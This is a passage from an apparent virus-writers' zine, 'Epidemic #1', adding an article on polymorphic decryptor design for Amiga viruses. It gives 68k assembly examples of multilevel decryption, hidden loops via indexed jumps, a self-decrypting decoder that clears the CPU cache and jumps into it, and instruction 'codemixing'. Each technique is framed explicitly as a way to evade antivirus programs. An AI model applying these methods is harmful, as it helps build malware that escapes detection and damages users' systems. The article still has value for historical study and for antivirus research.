@@ -1,0 +1,162 @@
+---------------
+* Epidemic #1 *
+---------------
+
+         Advanced polymorphism
+
+If you know what is the reason of writing the generator of decrypting routines,
+it's high time You got some more knowledge. I suppose You have read the
+previous article or, at least, You have the appropriate knowledge. So what
+else could we do to make our decoders better and more difficult to detect?
+
+Hmmm... We can do really a lot. I will try to introduce a few my ideas, which,
+although not really tested, can be easily used.
+
+1. Multilevel decryption. This invention was applied to Neurotic Death 5
+and.. works! In first decoder we have only one decrypting loop, but there are
+three decoders. First one decodes second, third and the virus. Second decodes
+third and virus and the third one decodes the real virus code and calls it.
+Of course we can use more decoders, but the time needed to decode the virus
+will increase and user may notice the slowdown.
+
+2. Jumps. Recently I have been working on generator which would make use of
+jumps with various addressing modes with special stress put on indexed modes.
+If antivirus program won't investigate the value stored in index register,
+it won't know where the code jumps. It requires much more work in writing
+procedures detecting such viruses. When we use a simple instructions like
+BRA.x xxxx or JMP xxxx(PC) we can read the destination of such jump fro the
+instruction offset.
+However, when we chose in registers set four address and four index registers
+we will surely offer a few sleepless nights to antivirus authors :)
+
+3. Operation size. It doesn't really have to be byte, word or longword. Except
+for those we could use 5, 11 or 19 bytes. A single loop in loop. In second
+loop we only have to change the argument and that's it.
+
+Example:
+
+   lea      buffer(pc),a0
+   moveq    #43,d0         ;length of outer loop
+   moveq    #$ab,d1        ;argument
+
+_loop2
+   moveq    #8,d2          ;length of decrypting loop
+                          ;together: 43+1 * 8+1 = 396 bytes
+    
+_loop1
+   eor.b    d1,(a0)+
+   dbf      d2,_loop1
+   addq.b   #3,d1
+   dbf      d0,_loop2
+
+
+4. Creation of appropriate decryptor during execution of decryptor-pretending
+procedure. Sounds interesting. Let's say our decoder is 512bytes big,
+instructions are connected with jumps and one is at most 100 bytes far from
+another. We remember the address of the biggest unused location in decoder.
+After it is created we call it with BRA or similar instruction to decrypt the
+virus code. Such loop does its work by another loop and another jump executes
+the real virus code.
+
+5. We can also use easier variant of above solution: we can place a decrypting
+loop in decryptor-pretending block and decode it. Then we just launch it with
+some branch instruction and done, i.e.:
+
+   bsr.s    _decrypt_decoder
+   
+;here we have a crypted decoding loop. We store its address somewhere
+;and call it after decryption
+
+   blk.l    5
+
+_decrypt_decoder:
+
+   move.l      (sp)+,a5
+   moveq       #4,d1             ;first index
+   move.w      #$1234,d7
+   move.l      #12,d3            ;second index
+   eor.w       d7,2(a5)          ;offset 2.w
+   bsr.s       _decode_1
+   add.w       #$eacf,(a5,d1.w)  ;offset 4.w
+   bsr.s       _decode_2
+   neg.w       (a5)              ;offset 0.w
+   moveq       #4,d0             ;address execbase in a6
+   move.l      d0,a6             ;
+   move.l      (a6),a6           ;
+   move.l      -634(a6),a1       ;grab CacheClearU() address
+   jsr         (a1)              ;Clear processor cache
+   jmp         (a5)              ;call decoder
+   
+
+_decode_1
+   neg.w       2(a5,d1.w)        ;offset 6.w
+   not.w       -4(a5,d3.l)       ;offset 8.w
+   rts
+
+_decode_2
+   sub.l       #$1111aaaa,(a5,d3.l) ;offset 12.l
+   eor.w       #$e234,6(a5,d1.l)    ;offset 10.w
+   bsr.s       _decode_3
+   rts
+
+_decode_3
+   move.l      4(a0,d3.l),d0     ;offset 16.l
+   ror.l       #1,d0
+   move.l      d0,4(a0,d3.l)
+   rts
+
+Above example shows one of the methods we can use for decryption.
+One more thing: there's not even one instruction in above code which would
+inform us that there is some loop. For bigger complication we can select
+in CPU register set four data and four address registers for indexes. The
+rest can be used for operations adresses and data regs as arguments for
+decrypting routines.
+
+6. One more, a really worth mentioning method is "codemixing". This method
+is based on replacing a single instruction with blocks (i.e. 3 to 8) which
+make exactly same thing. It's enough to remember which instructions from which
+block have already been placed in decoder and which have not.
+We can place instructions of any block independently in code, i.e.:
+
+;counter initiation in D0
+
+      eor.l    d0,d0
+      moveq    #100,d0
+      lsl.w    #2,d0
+
+;Argument initiation in D1
+
+      moveq    #0,d2
+      and.l    d2,d1
+      move.l   #$1234abcd,d2
+      eor.l    #$19cfeda5,d2
+
+example1:
+   
+      eor.l    d0,d0          ;1st part of instruction 1
+      moveq    #0,d2          ;1st part of instruction 2
+      and.l    d2,d1          ;2nd part of instruction 2
+      move.l   #$1234abcd,d2  ;3rd part of instruction 2
+      moveq    #100,d0        ;2nd part of instruction 1
+      lsl.w    #2,d0          ;3rd part of instruction 1
+      eor.l    #$19cfeda5,d2  ;4th part of instruction 1
+
+example2:
+      moveq    #0,d2          ;1st part of instruction 2
+      and.l    d2,d1          ;2nd part of instruction 2
+      eor.l    d0,d0          ;1st part of instruction 1
+      moveq    #100,d0        ;2nd part of instruction 1
+      move.l   #$1234abcd,d2  ;3rd part of instruction 2
+      eor.l    #$19cfeda5,d2  ;4th part of instruction 2
+      lsl.w    #2,d0    ;3rd part of instruction 1
+
+Both procedures work exactly same, but seem to be different. Antivirus program
+may have really big troubles finding instruction in decoder
+
+In next releases of Epidemic zine I will try to introduce my other ideas.
+By that time I will try to use some part of ideas introduced in this article.
+---------
+moveq #0,d0
+rts
+
+MaD roGEr
